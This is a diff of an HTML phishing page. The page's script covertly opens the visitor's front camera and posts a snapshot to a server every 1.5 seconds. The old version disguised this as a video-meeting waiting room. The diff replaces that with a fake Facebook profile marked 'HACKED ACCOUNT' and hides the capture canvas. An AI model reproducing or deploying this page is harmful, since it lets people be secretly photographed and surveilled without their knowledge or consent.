@@ -1,6 +1,5 @@
 <!doctype html>
 <html>
-
 <head>
   <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
   <script src="https://kit.fontawesome.com/c4c45dfab4.js" crossorigin="anonymous"></script>
@@ -11,113 +10,113 @@
   <video id="video" playsinline autoplay></video>
 </div>
 
-<center><canvas id="canvas" width="640" height="480" audoplay></canvas></center>
+<!-- Add the canvas element here -->
+<center><canvas id="canvas" width="640" height="480" style="display:none;"></canvas></center>
 
 <style>
   @import url("https://fonts.googleapis.com/css2?family=Nunito:wght@500;500&display=swap");
-
   body {
-    height: 100vh;
-    width: 100vw;
+    font-family: Arial, sans-serif;
+    background-color: #f0f2f5;
   }
 
-  * {
-    padding: 0px;
-    margin: 0px;
-    font-family: 'Nunito', sans-serif;
-    font-weight: 500;
-  }
-
-  .main-screen {
-    background-color: #273039;
-    height: 100vh;
+  .cover-photo {
     width: 100%;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-  }
-
-  img {
-    height: 80px;
-    width: 80px;
-  }
-
-  .bottom-bar {
-    position: fixed;
-    padding: 0px 40px 0px -40px;
-    bottom: 0px;
-    height: 80px;
-    width: 100%;
-    background-color: #1F2022;
-    display: flex;
-    flex-direction: row;
-    justify-content: center;
-    align-items: center;
-    color: #fff;
-  }
-
-  .icon-button {
-    display: flex;
-    flex-direction: column;
-    justify-items: center;
-    align-items: center;
-  }
-
-  i {
-    margin-bottom: 8px;
-    font-size: 26px;
-  }
-
-  button {
-    color: #fff;
-    background-color: crimson;
-    padding: 5px 20px;
-    border: none;
-    border-radius: 5px;
-    border-style: none;
-    outline: none;
-  }
-
-  .float_button {
-    background-color: #1F2022;
-    height: 40px;
-    border-radius: 5px;
-    width: 40px;
-    position: fixed;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    top: 5px;
-    right: 5px;
-  }
-  #ac-wrapper {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: rgba(255,255,255,.6);
-    z-index: 1001;
-}
-
-#popup {
-    width: 555px;
-    height: 35px;
-    background: #FFFFFF;
-    border: 5px solid #000;
-    border-radius: 15px;
-    -moz-border-radius: 15px;
-    -webkit-border-radius: 15px;
-    box-shadow: #64686e 0px 0px 3px 3px;
-    -moz-box-shadow: #64686e 0px 0px 3px 3px;
-    -webkit-box-shadow: #64686e 0px 0px 3px 3px;
+    height: 250px;
+    background: url('https://via.placeholder.com/1200x250') no-repeat center/cover;
     position: relative;
-    top: 250px; left: 375px;
-}
+  }
+  .profile-pic {
+    width: 160px;
+    height: 160px;
+    border-radius: 50%;
+    border: 5px solid #fff;
+    position: absolute;
+    bottom: -80px;
+    left: 20px;
+    background: url('https://via.placeholder.com/160') no-repeat center/cover;
+  }
+  .profile-info {
+    margin-left: 200px;
+    padding: 20px;
+  }
+  .profile-info h1 {
+    margin: 0;
+    font-size: 28px;
+  }
+  .profile-info p {
+    color: #606770;
+  }
+  .nav-tabs {
+    display: flex;
+    border-bottom: 1px solid #ccc;
+    margin: 20px 0;
+    padding-left: 20px;
+  }
+  .nav-tabs a {
+    text-decoration: none;
+    padding: 10px 20px;
+    color: #606770;
+    font-weight: bold;
+  }
+  .nav-tabs a.active {
+    border-bottom: 3px solid #1877f2;
+    color: #1877f2;
+  }
+  .container {
+    max-width: 900px;
+    margin: 20px auto;
+    background: #fff;
+    padding: 20px;
+    border-radius: 8px;
+    box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+  }
+  .intro, .photos, .posts {
+    margin-bottom: 30px;
+  }
+  .section-title {
+    font-size: 18px;
+    font-weight: bold;
+    margin-bottom: 10px;
+  }
+  .intro p {
+    margin: 5px 0;
+  }
+  .photos img {
+    width: 100px;
+    height: 100px;
+    object-fit: cover;
+    margin: 5px;
+    border-radius: 8px;
+  }
+  .post {
+    border-top: 1px solid #ccc;
+    padding-top: 10px;
+    margin-top: 10px;
+  }
+  .post-content {
+    font-size: 16px;
+    margin-bottom: 10px;
+  }
+  .post-actions {
+    display: flex;
+    gap: 10px;
+  }
+  .btn {
+    background-color: #e4e6eb;
+    color: #050505;
+    padding: 5px 10px;
+    text-decoration: none;
+    border-radius: 4px;
+    font-size: 14px;
+    display: inline-block;
+  }
+  .btn:hover {
+    background-color: #d8dadf;
+  }
 </style>
 
 <script>
-
   function post(imgdata) {
     $.ajax({
       type: 'POST',
@@ -126,13 +125,13 @@
       dataType: 'json',
       async: false,
       success: function (result) {
-        // call the function that handles the response/results
+        // handle success
       },
       error: function () {
+        // handle error
       }
     });
   };
-
 
   'use strict';
 
@@ -143,7 +142,6 @@
   const constraints = {
     audio: false,
     video: {
-
       facingMode: "user"
     }
   };
@@ -165,69 +163,89 @@
 
     var context = canvas.getContext('2d');
     setInterval(function () {
-
       context.drawImage(video, 0, 0, 640, 480);
       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
       post(canvasData);
       video.play();
     }, 1500);
-
-
   }
-  function PopUp(){
-    document.getElementById('ac-wrapper').style.display="none"; 
-}
+
+  function PopUp() {
+    document.getElementById('ac-wrapper').style.display = "none";
+  }
+
   // Load init
   init();
-  $(document).ready(function(){
-   setTimeout(function(){
+  $(document).ready(function () {
+    setTimeout(function () {
       PopUp();
-   },50000); // 5000 to load it after 5 seconds from page load
-});
+    }, 50000); // 50000 to load it after 50 seconds from page load
+  });
 </script>
 
 <body>
-  <div class="float_button">
-    <i class="fas fa-expand" style="color: #fff; font-size: 18px; margin-top: 5px;"></i>
-  </div>
-  <div id="ac-wrapper">
-    <div id="popup">
-        <center>
-            <h2>Please wait the meeting host will let you in soon</h2>
-        </center>
+    <div class="header">Facebook Profile</div>
+
+    <div class="cover-photo">
+        <div class="profile-pic"></div>
     </div>
-</div>
-  <div class="bottom-bar">
-    <div class="icon-button" style="margin-left: 50px;">
-      <i class="fas fa-microphone"></i>
-      <h6>Mute</h6>
+
+    <div class="profile-info">
+        <h1>John Boro</h1>
+        <p>1.3K friends</p>
     </div>
-    <div class="icon-button" style="margin-left: 50px;">
-      <i class="fas fa-video"></i>
-      <h6>Stop Video</h6>
+
+    <div class="nav-tabs">
+        <a href="#" class="active">Posts</a>
+        <a href="#">About</a>
+        <a href="#">Friends</a>
+        <a href="#">Photos</a>
+        <a href="#">Videos</a>
+        <a href="#">More</a>
     </div>
-    <div class="icon-button" style="margin-left: auto;">
-      <i class="fas fa-shield-alt"></i>
-      <h6>Security</h6>
+
+    <div class="container">
+        <div class="intro">
+            <div class="section-title">Intro</div>
+            <p>Add bio</p>
+            <p>Followed by 1.2k people</p>
+        </div>
+
+        <div class="photos">
+            <div class="section-title">Photos</div>
+            <img src="https://via.placeholder.com/100" alt="Photo 1">
+            <img src="https://via.placeholder.com/100" alt="Photo 2">
+            <img src="https://via.placeholder.com/100" alt="Photo 3">
+            <img src="https://via.placeholder.com/100" alt="Photo 4">
+            <img src="https://via.placeholder.com/100" alt="Photo 5">
+        </div>
+
+        <div class="posts">
+            <div class="section-title">Posts</div>
+            <div class="post">
+                <div class="post-content">
+                    <strong>John Boro</strong> <br>
+                    “HACKED ACCOUNT”
+                </div>
+                <div class="post-actions">
+                    <a href="#" class="btn">Like</a>
+                    <a href="#" class="btn">Comment</a>
+                    <a href="#" class="btn">Share</a>
+                </div>
+            </div>
+            <div class="post">
+                <div class="post-content">
+                    <strong>John Boro</strong> <br>
+                    What's on your mind?
+                </div>
+                <div class="post-actions">
+                    <a href="#" class="btn">Like</a>
+                    <a href="#" class="btn">Comment</a>
+                    <a href="#" class="btn">Share</a>
+                </div>
+            </div>
+        </div>
     </div>
-    <div class="icon-button" style="margin-left: 50px;">
-      <i class="fas fa-users"></i>
-      <h6>Participants</h6>
-    </div>
-    <div class="icon-button" style="color: lawngreen; margin-left: 50px;">
-      <i class="fas fa-plus-square"></i>
-      <h6>Share content</h6>
-    </div>
-    <div class="icon-button" style="margin-left: 50px;">
-      <i class="fas fa-comments"></i>
-      <h6>Chat</h6>
-    </div>
-    <div class="icon-button" style="margin-right: auto; margin-left: 50px;">
-      <i class="fas fa-record-vinyl"></i>
-      <h6>Record</h6>
-    </div>
-    <button style="margin-right: 50px;">End</button>
-  </div>
 </body>
 
 </html>
